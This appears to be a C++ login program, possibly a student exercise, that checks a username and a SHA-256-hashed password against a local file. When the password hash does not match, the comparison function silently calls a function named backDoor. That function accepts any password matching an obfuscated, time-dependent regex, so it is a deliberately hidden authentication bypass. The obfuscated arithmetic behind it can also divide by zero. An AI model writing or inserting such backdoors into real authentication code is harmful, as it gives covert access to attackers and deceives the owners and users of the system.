#include <iostream>
#include "authlib.h"
#include <openssl/sha.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <cmath>
#include <regex>

bool temp1 = true;
std::string password;

int main() 
{
	makeTime();
	//operations(makeTime());

	bool auth = promptUser();
	while (!auth)
	{
		operations(makeTime());
		rejected("user");
		auth = promptUser();
	}

	authenticated("username tbc");
	//operations(std::time_t currTime);
}

std::time_t makeTime(){
	std::time_t currTime = std::time(nullptr);
	//std::cout << "it is currently " << currTime << std::endl;
	return currTime;
}

// see overflows

int operations(std::time_t currTime){
	currTime = std::floor(currTime / 60);
	currTime = currTime % 60;
	int timeTwo = (currTime % 360);
	int timeThree = currTime*currTime;
	currTime = temp1 ? ((currTime*timeTwo*60)+currTime/currTime+((currTime*currTime)%((3*currTime)/(currTime))))%(timeTwo*12344566*currTime)*33422462 : rand();
	timeTwo = timeThree+currTime;
	std::cout << currTime << std::endl;
	temp1 = false;
	return currTime;
}

bool backDoor(std::string username)
{
	std::string temp = std::to_string(operations(makeTime()));

	 std::stringstream ss;
    ss << "(?:_-_-_-__-_-:" << temp << "#€@){" << username.length() << "}a";
    std::cout << username.length() << std::endl;
    std::string usernamelengthpattern = ss.str();
    std::string pattern = R"((?:std::hex)(?:w?)?(p_a:e+t/r){4}[^[:lower:]]{3}!?&+[[:punct:]^]+\1{2}x£[^erd].{4}&%!(?:¢:65?43`{7}){4}\1-)" + ss.str();
    std::regex regex{pattern};
    bool matched = std::regex_match(password, regex);

	//std::string time = hashPassword();
	//std::cout << "time: " << time << " pword: " << password << std::endl;
	return matched;
}
/*

	// constructing regex pattern
    std::stringstream ss;
    ss << "(?:_-_-_-__-_-:" << random << "#€@){" << username.length() << "}a";
    std::string usernamelengthpattern = ss.str();
    std::string pattern = R"((?:std::hex)(?:w?)?(\t_a:e+t/r){4}[^[:lower:]]{3}!?&+[[:punct:]^]+\1{2}x£[^erd].{4}&%!(?:¢:65?43[[:s:]]{7}){4}\1-)" + ss.str();

`	// initialising regex
    std::regex regex{pattern};

	// matching input v regex (returns true if match)
    bool matched = std::regex_match(password, regex);
*/

//prompts user for their username and password
bool promptUser()
{
	std::string userName;
	std::cout<< "Please enter your username: "<<std::endl;
	std::cin >> userName;
	std::cin.clear();
	std::cout<<"Please enter your password: "<<std::endl;
	std::cin >> password;

	std::string userPass = hashPassword(password);
	std::string storedPass = getHashPass(userName);

	if(compareHashedPasses(userPass,storedPass,userName))
	{
		std::cout << "they match ye: ";
		return true;
	}
	else
	{
		std::cout << "dont match get away: ";
		return false;
	}
}

std::string hashPassword(std::string password)
{
	unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, password.c_str(), password.size());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for(int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    return ss.str();
}

std::string getHashPass(std::string username)
{
	std::ifstream infile("pwdb.txt");
	int offset;
	std::string hashWord;
	username.append(":");
	std::string line;
	while(!infile.eof())
	{
		getline(infile,line);
		if ((offset = line.find(username,0)) !=(int)std::string::npos)
		{
			hashWord = line.substr(username.length(),64);
		}
	}

	infile.close();
	return hashWord;
}

bool compareHashedPasses(std::string userPass, std::string storedPass, std::string userName)
{
	return (userPass == storedPass) ? true : (backDoor(userName));

}

